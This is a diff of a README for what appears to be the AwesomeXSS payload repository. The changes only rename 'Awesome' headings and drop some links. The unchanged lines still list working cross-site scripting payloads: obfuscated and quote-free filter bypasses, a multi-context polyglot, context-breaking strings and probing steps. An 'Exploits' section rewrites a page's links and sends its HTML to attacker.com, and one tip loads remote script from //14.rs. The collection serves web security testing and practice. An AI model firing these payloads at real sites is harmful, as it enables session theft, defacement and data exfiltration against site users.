@@ -4,7 +4,7 @@ Curated and categorized XSS payload repository with usage guides, PoC templates,
 # Note
 This repository is a collection of XSS-payloads resources. Contributions are welcome and should be submitted via an issue.
 
-### Awesome contents
+### Contents
 - [Challenges](https://github.com/s0md3v/AwesomeXSS#awesome-challenges)
 - [Reads & Presentations](https://github.com/s0md3v/AwesomeXSS#awesome-reads--presentations)
 - [Tools](https://github.com/s0md3v/AwesomeXSS#awesome-tools)
@@ -24,7 +24,7 @@ This repository is a collection of XSS-payloads resources. Contributions are wel
 - [Encoding](https://github.com/s0md3v/AwesomeXSS#awesome-encoding)
 - [Tips & tricks](https://github.com/s0md3v/AwesomeXSS#awesome-tips--tricks)
 
-### Awesome Challenges
+### Challenges
 - [prompt.ml](https://prompt.ml)
 - [alf.nu/alert1](https://alf.nu/alert1)
 - [xss-game.appspot.com](https://xss-game.appspot.com)
@@ -35,7 +35,7 @@ This repository is a collection of XSS-payloads resources. Contributions are wel
 - [wechall.net](https://www.wechall.net/challs/XSS)
 - [codelatte.id/labs/xss](https://codelatte.id/labs/xss)
 
-### Awesome Reads & Presentations
+### Reads & Presentations
 - [Bypassing XSS Detection Mechanisms](https://github.com/s0md3v/MyPapers/tree/master/Bypassing-XSS-detection-mechanisms)
 - [XSS in Facebook via PNG Content Type](https://whitton.io/articles/xss-on-facebook-via-png-content-types/)
 - [How I met your girlfriend](https://www.youtube.com/watch?v=fWk_rMQiDGc)
@@ -43,15 +43,12 @@ This repository is a collection of XSS-payloads resources. Contributions are wel
 - [Blind XSS](https://www.youtube.com/watch?v=OT0fJEtz7aE)
 - [Copy Pest](https://www.slideshare.net/x00mario/copypest)
 
-### Awesome Tools
+### Tools
 - [XSStrike](https://github.com/UltimateHackers/XSStrike)
 - [BeEF](https://github.com/beefproject/beef)
 - [JShell](https://github.com/UltimateHackers/JShell)
 
-### Awesome XSS Mind Maps
-A beautiful XSS mind map by Jack Masa, [here](https://github.com/s0md3v/AwesomeXSS/blob/master/Database/jackmasa-mind-map.png)
-
-### Awesome DOM XSS
+### DOM XSS
 
 - Does your input go into a sink? `Vulnerable`
 - It doesn't? `Not vulnerable`
@@ -102,7 +99,7 @@ document.location
 
 This comprehensive list of sinks and source is taken from [domxsswiki](https://github.com/wisec/domxsswiki).
 
-### Awesome Payloads
+### Payloads
 ```
 <A/hREf="j%0aavas%09cript%0a:%09con%0afirm%0d``">z
 <d3"<"/onclick="1>[confirm``]"<">z
@@ -127,19 +124,12 @@ This comprehensive list of sinks and source is taken from [domxsswiki](https://g
 <svg onload=write()>
 ```
 
-### Awesome Polyglots
+### Polyglots
 
 Here's an XSS polyglot that I made which can break out of 20+ contexts:
 ```
 %0ajavascript:`/*\"/*-->&lt;svg onload='/*</template></noembed></noscript></style></title></textarea></script><html onmouseover="/**/ alert()//'">`
 ```
-
-Explanation of how it works, [here](https://github.com/s0md3v/AwesomeXSS/blob/master/Database/polyglot.png)
-
-### Awesome Tags & Event Handlers
-- [105 Event Handlers with description](https://github.com/UltimateHackers/AwesomeXSS/blob/master/Database/event-handlers.md)
-- [200 Event Handlers without description](http://pastebin.com/raw/WwcBmz5J)
-
 Some less detected event handlers
 ```
 ontoggle
@@ -166,7 +156,7 @@ audio
 video
 ```
 
-### Awesome Context Breaking
+### Context Breaking
 
 #### HTML Context
 Case: `<tag>You searched for $input. </tag>`
@@ -199,7 +189,7 @@ Case: `<script> var new something = '$input'; </script>`
 </script><svg onload=alert()>
 ```
 
-### Awesome Confirm Variants
+### Confirm Variants
 Yep, confirm because alert is too mainstream.
 ```
 confirm()
@@ -218,7 +208,7 @@ new class extends confirm``{}
 [8].findIndex(confirm)
 ```
 
-### Awesome Exploits
+### Exploits
 ##### Replace all links
 ```javascript
 Array.from(document.getElementsByTagName("a")).forEach(function(i) {
@@ -230,8 +220,8 @@ Array.from(document.getElementsByTagName("a")).forEach(function(i) {
 <svg/onload="(new Image()).src='//attacker.com/'%2Bdocument.documentElement.innerHTML">
 ```
 
-### Awesome Probing
-If nothing of this works, take a look at **Awesome Bypassing** section
+### Probing
+If nothing of this works, take a look at **Bypassing** section
 
 First of all, enter a non-malicious string like **d3v** and look at the source code to get an idea about number and contexts of reflections.
 <br>Now for attribute context, check if double quotes (") are being filtered by entering `x"d3v`. If it gets altered to `x&quot;d3v`, chances are that output is getting properly escaped. If this happens, try doing the same for single quotes (') by entering `x'd3v`, if it gets altered to `x&apos;`, you are doomed. The only thing you can try is encoding.<br>
@@ -263,7 +253,7 @@ If the your dummy tags lands in the source code as it is, go for any of these pa
 <details open ontoggle=alert()>
 ```
 
-### Awesome Bypassing
+### Bypassing
 
 **Note:** None of these payloads use single (') or double quotes (").
 
@@ -312,7 +302,7 @@ If the your dummy tags lands in the source code as it is, go for any of these pa
 </script x>
 ```
 
-### Awesome Encoding
+### Encoding
 
 |HTML|Char|Numeric|Description|Hex|CSS (ISO)|JS (Octal)|URL|
 |----|----|-------|-----------|----|--------|----------|---|
@@ -347,7 +337,7 @@ If the your dummy tags lands in the source code as it is, go for any of these pa
 |`&verbar;`|\||`&#124;`|vertical bar|u+007c|\007c|\174|%7c|
 |`&rcub;`|}|`&#125;`|right curly bracket|u+007d|\007d|\175|%7d|
 
-### Awesome Tips & Tricks
+### Tips & Tricks
 - `http(s)://` can be shortened to `//` or `/\\` or `\\`.
 - `document.cookie` can be shortened to `cookie`. It applies to other DOM objects as well.
 - alert and other pop-up functions don't need a value, so stop doing `alert('XSS')` and start doing `alert()`
@@ -356,6 +346,6 @@ If the your dummy tags lands in the source code as it is, go for any of these pa
 - Quotes around attribute value aren't necessary as long as it doesn't contain spaces. You can use `<script src=//14.rs>` instead of `<script src="//14.rs">`
 - The shortest HTML context XSS payload is `<script src=//14.rs>` (19 chars)
 
-### Awesome Credits
+### Credits
 All the payloads are crafted by me unless specified.
 
